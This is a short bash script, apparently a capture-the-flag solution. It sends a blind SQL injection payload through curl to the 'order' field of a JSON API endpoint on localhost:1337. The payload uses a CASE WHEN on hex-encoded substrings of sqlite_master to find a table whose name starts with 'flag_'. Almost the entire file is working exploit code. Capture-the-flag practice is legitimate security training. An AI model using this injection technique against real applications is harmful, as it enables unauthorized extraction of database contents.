#!/bin/bash

url="${1-localhost:1337}"

sqli_post(){
  curl -X POST "http://${url}/api/list" \
    -H "Content-Type: application/json" \
    -d "{\"order\":\"${1}\"}"
}

sqli_post "(CASE WHEN (SELECT HEX(SUBSTR(tbl_name,1,4)) FROM sqlite_master \
  WHERE type='table' AND tbl_name LIKE 'flag_%' limit 1 offset 0)=HEX('flag') \
  THEN id ELSE count END) ASC"
